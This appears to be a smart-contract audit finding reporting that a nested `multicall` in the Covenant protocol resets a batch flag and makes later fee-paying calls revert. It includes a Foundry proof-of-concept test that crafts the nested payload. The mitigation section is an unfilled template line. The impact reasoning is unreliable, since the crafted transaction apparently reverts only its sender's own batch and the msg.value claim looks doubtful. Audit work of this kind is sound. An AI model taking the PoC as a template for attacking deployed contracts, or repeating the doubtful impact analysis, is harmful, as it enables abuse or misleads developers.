  "body": "## Finding description and impact\n\nThe `Covenant.multicall` function uses a storage variable `_isMulticall` to signal to other functions (`mint`, `redeem`, `swap`, `updateState`) that they are being called as part of a batch. This flag allows these functions to bypass the strict `msg.value == msgValue` check in the `_checkPayment` helper, as the total `msg.value` is handled by the top-level `multicall`.\n\nThe `multicall` function sets `_isMulticall = true` at the beginning and `_isMulticall = false` at the end.\n\n```solidity\n// in Covenant.sol\nfunction multicall(bytes[] calldata data) external payable returns (bytes[] memory results) {\n    uint256 balanceBeforeCall = address(this).balance - msg.value;\n\n    _isMulticall = true;\n    results = MulticallLib.multicall(data);\n    _isMulticall = false; // This is the problematic line in a re-entrant context\n\n    if (address(this).balance != balanceBeforeCall) revert Errors.E_IncorrectPayment();\n\n    return results;\n}\n```\n\nThe vulnerability occurs because `multicall` can be called recursively via `delegatecall`. If a user crafts a `multicall` where one of the inner calls is to `multicall` itself, the nested (inner) `multicall` will execute and set `_isMulticall` to `false` upon completion. When control returns to the outer `multicall`'s loop, the `_isMulticall` flag is now `false`, even though the outer batch operation is still in progress.\n\nAny subsequent call in the outer `multicall` that requires a fee (e.g., `updateState`) will now fail in `_checkPayment`, because `_isMulticall` is `false` and the `delegatecall`'s `msg.value` is 0, which will not match the required fee specified in the call parameters. This reverts the entire transaction.\n\n### Impact\nThis vulnerability allows for a Denial of Service on the `multicall` functionality. A malicious user can craft a transaction that includes a nested `multicall` to make any legitimate batch transaction that follows it (and requires a fee) fail. This breaks a core feature of the protocol designed for gas efficiency and user experience.\n## Recommended mitigation steps\n\nDescribe the best method(s) to mitigate the finding.",
  "proof_of_concept": "The PoC is provided in `test/poc/Nested_Multicall_DoS.t.sol`. It demonstrates the vulnerability by crafting a `multicall` that contains a nested `multicall` followed by a call that requires a fee. The test expects the transaction to revert with `E_IncorrectPayment`, which it does, proving the DoS vector.\n\n```solidity\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity ^0.8.30;\n\nimport \"forge-std/Test.sol\";\nimport {Covenant, MarketId, MarketParams, Errors} from \"../../src/Covenant.sol\";\nimport {LatentSwapLEX} from \"../../src/lex/latentswap/LatentSwapLEX.sol\";\nimport {IPriceOracle} from \"../../src/interfaces/IPriceOracle.sol\";\nimport {MockERC20} from \"../mocks/MockERC20.sol\";\nimport {FixedPoint} from \"../../src/lex/latentswap/libraries/FixedPoint.sol\";\nimport {LatentSwapLib} from \"../../src/periphery/libraries/LatentSwapLib.sol\";\n\n// A simple oracle that requires a fee for updates.\ncontract FeeOracle is IPriceOracle {\n    function name() external pure returns (string memory) { return \"FeeOracle\"; }\n    function getQuote(uint256 inAmount, address, address) external view returns (uint256) { return inAmount; }\n    function getQuotes(uint256 inAmount, address, address) external view returns (uint256, uint256) { return (inAmount, inAmount); }\n    function previewGetQuote(uint256 inAmount, address, address) external view returns (uint256) { return inAmount; }\n    function previewGetQuotes(uint256 inAmount, address, address) external view returns (uint256, uint256) { return (inAmount, inAmount); }\n    function updatePriceFeeds(address, address, bytes calldata) external payable {}\n    function getUpdateFee(address, address, bytes calldata) external view returns (uint128) { return 0.1 ether; }\n}\n\ncontract C4PoC is Test {\n    Covenant public covenant;\n    LatentSwapLEX public lex;\n    address internal _mockBaseAsset;\n    address internal _mockQuoteAsset;\n    uint160 internal constant P_MAX = uint160((1095445 * FixedPoint.Q96) / 1000000);\n    uint160 internal constant P_MIN = uint160(FixedPoint.Q192 / P_MAX);\n    uint32 internal constant DURATION = 30 * 24 * 60 * 60;\n    int64 internal constant LN_RATE_BIAS = 5012540000000000;\n    uint160 private P_LIM_H = LatentSwapLib.getSqrtPriceFromLTVX96(P_MIN, P_MAX, 9500);\n    uint160 private P_LIM_MAX = LatentSwapLib.getSqrtPriceFromLTVX96(P_MIN, P_MAX, 9999);\n\n    function setUp() public {\n        _mockBaseAsset = address(new MockERC20(address(this), \"MockBaseAsset\", \"MBA\", 18));\n        _mockQuoteAsset = address(new MockERC20(address(this), \"MockQuoteAsset\", \"MQA\", 18));\n\n        covenant = new Covenant(address(this));\n        lex = new LatentSwapLEX(address(this), address(covenant), P_MAX, P_MIN, P_LIM_H, P_LIM_MAX, LN_RATE_BIAS, DURATION, 0);\n        \n        covenant.setEnabledLEX(address(lex), true);\n    }\n\n    function test_NestedMulticallDoS() public {\n        // 1. Deploy and configure an oracle that requires a fee.\n        FeeOracle feeOracle = new FeeOracle();\n        covenant.setEnabledCurator(address(feeOracle), true);\n\n        // 2. Create a market that uses this oracle.\n        MarketParams memory marketParams = MarketParams({\n            baseToken: _mockBaseAsset,\n            quoteToken: _mockQuoteAsset,\n            curator: address(feeOracle),\n            lex: address(lex)\n        });\n        MarketId marketId = covenant.createMarket(marketParams, hex\"\");\n\n        // 3. Determine the fee required for an updateState call.\n        uint256 fee = feeOracle.getUpdateFee(marketParams.baseToken, marketParams.quoteToken, \"\");\n        assertTrue(fee > 0);\n\n        // 4. Craft the malicious nested multicall payload.\n        bytes[] memory innerMulticallData = new bytes[](0);\n        bytes memory innerCall = abi.encodeWithSelector(covenant.multicall.selector, innerMulticallData);\n\n        bytes memory updateCall = abi.encodeWithSelector(\n            covenant.updateState.selector,\n            marketId,\n            marketParams,\n            bytes(\"\"),\n            fee\n        );\n\n        bytes[] memory outerMulticallData = new bytes[](2);\n        outerMulticallData[0] = innerCall;\n        outerMulticallData[1] = updateCall;\n\n        // 5. Expect the transaction to revert with E_IncorrectPayment.\n        vm.expectRevert(Errors.E_IncorrectPayment.selector);\n\n        // 6. Execute the multicall. This call will fail, demonstrating the DoS vulnerability.\n        covenant.multicall{value: fee}(outerMulticallData);\n    }\n}\n\n\n```",
